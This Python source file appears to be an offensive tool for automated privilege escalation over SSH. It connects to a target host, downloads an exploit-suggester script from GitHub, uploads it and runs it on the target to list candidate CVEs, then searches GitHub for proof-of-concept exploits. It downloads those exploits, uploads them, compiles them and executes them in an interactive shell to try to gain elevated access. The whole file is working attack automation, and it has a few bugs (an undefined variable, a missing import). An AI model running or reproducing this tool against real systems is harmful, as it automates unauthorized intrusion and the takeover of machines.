import paramiko
import argparse
import readline
import requests as rq
import os
import json
import sys
import select
import tty
import termios
import platform
import time

extl = {"python": "py"}
lgs = {
    "python": ["python3", "python", "py", "python2"],
    "c": ["gcc -o", "clang -o", "tcc -o"],
    "go": ["go run"]
}
lgics = {"python":"🐍", "go":"🇬", "c":"🇨"}

avll=[]
avlc=[]
loccmp=[]

success_time=5
lexf_url = "https://raw.githubusercontent.com/Trickhish/automated_privilege_escalation/main/lexf.sh"

def lgic(lg):
    ic = lgics[lg] if lg in lgics else ""
    ext = (extl[lg] if lg in extl else lg).upper()
    return(("" if ic=="" else ic+"-")+ext)

def open_shell(connection, stcmd=""):
    remote_name="ssh"
    oldtty_attrs = termios.tcgetattr(sys.stdin)

    channel = connection.invoke_shell()
    channel.settimeout(0.0)

    try:
        tty.setraw(sys.stdin.fileno())
        tty.setcbreak(sys.stdin.fileno())
        
        is_alive = True

        if stcmd!="":
            channel.send(stcmd+"\n")
        
        while is_alive:
            read_ready, _, _ = select.select([channel, sys.stdin], [], [])

            if channel in read_ready:
                try:
                    out = channel.recv(1024)
                    if len(out) == 0:
                        is_alive = False
                    else:
                        sys.stdout.write(out.decode("utf-8"))
                        sys.stdout.flush()

                except socket.timeout:
                    pass

            if sys.stdin in read_ready and is_alive:
                char = os.read(sys.stdin.fileno(), 1)
                if len(char) == 0:
                    is_alive = False
                else:
                    channel.send(char)

        channel.shutdown(2)

    finally:
        termios.tcsetattr(sys.stdin, termios.TCSAFLUSH, oldtty_attrs)

def search(q, avl):
    lgq = "language%3A"+("+language%3A".join(avl))
    r = rq.get("https://github.com/search?q="+q+"+"+lgq+"&type=repositories&s=&o=desc").text
    r = json.loads(r)
    r = r["payload"]["results"]
    return([["https://github.com/"+e["hl_name"].replace("<em>", "").replace("</em>", ""), e["language"]] for e in r])

def getScripts(url):
    r = rq.get(url).text
    r = r.split('<a class="js-navigation-open Link--primary" title="')[1:]
    return([e.split('">')[0].split('" data-turbo-frame="repo-content-turbo-frame" href="') for e in r])

def getpocs(cve, avl):
    try:
        rl = search(cve, avl)
        gex={}
        for r in rl:
            [url, lg] = r
            lg = lg.lower()
            sl = getScripts(url)
            #print(url+" : "+lg)

            ext = extl[lg] if lg in extl else lg
            gfl = [s for s in sl if ext==s[0].split(".")[-1]]

            #print("    "+("\n    ".join(gfl)))

            if len(gfl)==1: # gfl!=[]
                gex[url] = [lg, gfl]
    
            #for s in sl:
            #    aex = s[0].split(".")[-1]
            #    if (aex!=ext):
            #        continue
            #    print("    -> "+s[0])
        return(gex)
    except KeyboardInterrupt:
        print("\n🚪 Exiting")
        exit()
    except Exception as e:
        return(False)

def send(ssh, frm, to):
    if not os.path.isfile(frm):
        print("File doesn't exist")
        return
    
    sftp = ssh.open_sftp()
    sftp.put(frm, to, callback=None, confirm=True)
    sftp.close()

def exec(ssh, cmd):
    stdin, stdout, stderr = ssh.exec_command(cmd)
    return([stdout.read().decode(), stdout.channel.recv_exit_status()])

def findcve(ssh):
    try:
        if (os.path.isfile("/tmp/lexf.sh")):
            pth="/tmp/lexf.sh"
        elif (os.path.isfile("lexf.sh")):
            pth="lexf.sh"
        else:
            with open("lexf.sh", 'wb') as f:
                f.write(rq.get(lexf_url).content)
                pth="lexf.sh"
        try:
            send(ssh, pth, "/tmp/script.sh")
            r = exec(ssh, 'bash /tmp/script.sh')[0]
        except:
            send(ssh, pth, "script.sh")
            r = exec(ssh, "bash script.sh")[0]
        r = r.split("Possible Exploits:")[1]
        r = r.split("\n")[2:-1]
        r = ["CVE"+e.split("[CVE")[1].split("]")[0] for e in r]
        return(r)
    except KeyboardInterrupt:
        print("Quitting")
        exit()
    except Exception as e:
        print("Error:",str(e))
        return([])
    
def checkcmd(ssh, cmd):
    r = exec(ssh, '[ -x "$(command -v '+cmd+')" ] && echo "true" || echo "false"')[0]
    return(r.strip() == "true")

def checklgs(ssh):
    global lgs
    global avlc
    avlc=[]

    ll=[]
    for l in lgs:
        cmds = lgs[l]
        fo=False
        for c in cmds:
            if checkcmd(ssh, c):
                fo=True
                avlc.append(c)
                break
        if fo:
            ll.append(l)
            print("  ✅ "+l+" supported")
        else:
            print("  ❌ No support for "+l)
    
    return(ll)

def runpoc(ssh, url, lg, ext):
    print("      📥 Downloading POC")
    with open("script."+ext, 'wb') as f:
        f.write(rq.get(rurl).content)

    print("      📤 Uploading POC")
    send(ssh, "script."+ext, "script."+ext)

    if (ext=="py"):
        cmd = next((c for c in avlc if c in lgs[lg]))
        #print(cmd+" /tmp/script.py")
        print("      Running Shell\n")
        sts = time.monotonic()
        open_shell(ssh, cmd+" script.py; exit")
        if (time.monotonic()-sts < success_time):
            return(False)
    elif (ext=="c"):
        print("      ⚙️ Compiling - ", end="")
        #cmd = next((c for c in avlc if c in lgs[lg]))

        #print(cmd+" /tmp/script.c")
        r=""
        rc=1
        for cmd in [c for c in avlc if c in lgs[lg]]:
            [r, rc] = exec(ssh, cmd+" script.exe script.c")
            if rc==0:
                break

        if rc!=0:
            print("failed")
            print("      ⚙️ Trying to compile locally - ", end="")

            rc=1
            for c in loccmp:
                try:
                    r = os.system(c+" script.exe script.c "+("> NUL 2>&1" if platform.system()=="Windows" else "> /dev/null 2>&1"))
                    rc = os.WEXITSTATUS(r)
                except:
                    rc=1
                if rc==0:
                    break

            if rc==0:
                print("suceeded")
                print("      📤 Uploading compiled POC")
                send(ssh, "script.exe", "script.exe")
                print("       Running Shell")
                sts=time.monotonic()
                open_shell(ssh, "./script.exe; exit")
                if (time.monotonic()-sts < success_time):
                    return(False)
            else:
                print("failed")
                return(False)
        else:
            print("succeeded")
            print("      Running Shell\n")
            sts=time.monotonic()
            open_shell(ssh, "./script.exe; exit")
            if (time.monotonic()-sts < success_time):
                return(False)
    elif (ext=="go"):
        print("      Running Shell\n")
        sts=time.monotonic()
        open_shell(ssh, "go ./script.go; exit")
        if (time.monotonic()-sts < success_time):
            return(False)
    return(True)

def checkloccmd(command):
    command=command.split(" ")[0]
    
    system = platform.system()
    if system == "Windows":
        return os.system(f"where {command} > nul 2>&1") == 0
    elif system == "Linux" or system == "Darwin":
        return os.system(f"which {command} > /dev/null 2>&1") == 0
    else:
        return False

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Automatic Privilege Escalation through SSH')
    parser.add_argument('user_host', type=str, help='user@host of ssh server')
    parser.add_argument('--pwd', type=str, help='Password for authentication')
    parser.add_argument('--pvk', type=str, help='Path to the private key file for authentication')

    args = parser.parse_args()
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
        [user, host] = args.user_host.split("@")
        print("Connecting to "+str(user)+"@"+str(host)+" with "+("password" if args.pwd else "private key")+"\n")
        if (args.pvk):
            private_key = paramiko.RSAKey.from_private_key_file(args.pvk)
            ssh.connect(host, username=user, pkey=private_key)
        else:
            ssh.connect(host, username=user, password=args.pwd)

        print("Checking local C support ", end="")
        #loccmp
        for c in lgs["c"]:
            if (checkloccmd(c)):
                loccmp.append(c)
        print(("❌" if loccmp==[] else "✅")+"\n")
            
        print("Checking languages support")
        avll = checklgs(ssh)
        if avll==[]:
            print("No language supported, aborting")
            ssh.close()
            exit()
        else:
            print("")

        print("🔎 Looking for exploits")
        cl = findcve(ssh)
        if cl==[]:
            print("No exploit found")
        else:
            print("Found "+str(len(cl))+" exploits")
            for e in cl:
                try:
                    print("  🔎 Looking for a POC for "+e)
                    pl = getpocs(e, avll)
                    if pl==False:
                        pl=getpocs(e, avll)
                    
                    if pl=={}:
                        print("  None found\n")
                        continue
                    print("  Found "+str(len(pl)))

                    for i in range(len(pl)):
                        r=list(pl.keys())[i]
                        [lg, [[nm, url]]]=pl[r]
                        url = "https://github.com"+url
                        rurl = url.replace("/blob/", "/raw/")
                        ext = nm.split(".")[-1].lower()
                    
                        print("    Trying "+lgic(lg.lower())+" "+r)
                        if runpoc(ssh, rurl, lg.lower(), ext):
                            a = str(input("\nWas that successful ? (y/N): "))
                            if not (a.lower() in ["y","yes","oui", "o"]):
                                print("    Resuming search")
                            else:
                                print("\n🚪 Exiting")
                                ssh.close()
                                exit()
                        #print("    "+str(i+1)+" : "+r+" ("+dt[0].upper()+")")
                
                        #break
                    print("")
                    #print("    "+("\n    ".join(cl)))
                except KeyboardInterrupt:
                    print("\n🚪 Exiting")
                    ssh.close()
                    exit()
                    
                except Exception as ex:
                    print("  Failed: "+str(ex))
    
    except KeyboardInterrupt:
        print("\n🚪 Exiting")
        shh.close()
        exit()
    except Exception as ex:
        print("\n❗Error : "+str(ex))
        print("🚪 Exiting")

    ssh.close()
